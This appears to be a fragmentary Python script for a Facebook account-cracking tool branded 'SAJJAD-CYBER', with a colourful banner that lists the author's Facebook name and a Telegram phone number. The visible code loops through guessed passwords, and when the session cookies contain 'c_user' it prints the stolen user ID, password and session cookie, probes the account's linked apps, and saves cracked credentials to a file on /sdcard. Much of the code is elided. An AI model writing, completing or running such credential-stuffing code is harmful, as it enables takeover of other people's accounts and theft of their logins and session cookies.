...
def cek_apk(session,coki):
    ...
    #game = [i.text for i in x.find_ah3")]
    if len(game)==0:
...
print("walcome to SEE Bangladesh Sajjad cyber")
os.system("pkg install espeak")
from os import system as _SAJJAD_
def lo(word):
...
┃ \033[38;5;46m𝗢𝗪𝗡𝗘𝗥    : \033[38;5;46mSAJJAD-CYBER    ┃
┃ \033[38;5;46m𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 : \033[38;5;46mMd.Sajjad Hossen Saif        ┃
┃ \033[38;5;46mTELEGRAM \033[38;5;46m+8801892303448┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
def linex():
	print('\033[1;94m✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺✺')
loop = 0
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[38;5;46m [SAJJAD-CYBER-??𝟰𝟵𝟵-OK💙] ' +uid+ ' | ' +ps+    '  \n \033[1;33m[√]\033[1;32mCookie = \033[38;5;46m'+coki+  '  ''  \033[1;34m')
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/SAJJAD-CYBER-𝟬𝟰𝟵𝟵-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                continue
        loop+=1
        brand=random.choice(['SAJJAD-CYBER','SAJJAD-CYBER ','SAJJAD CRACK '])
        ...
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mSAJJAD-CYBER💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()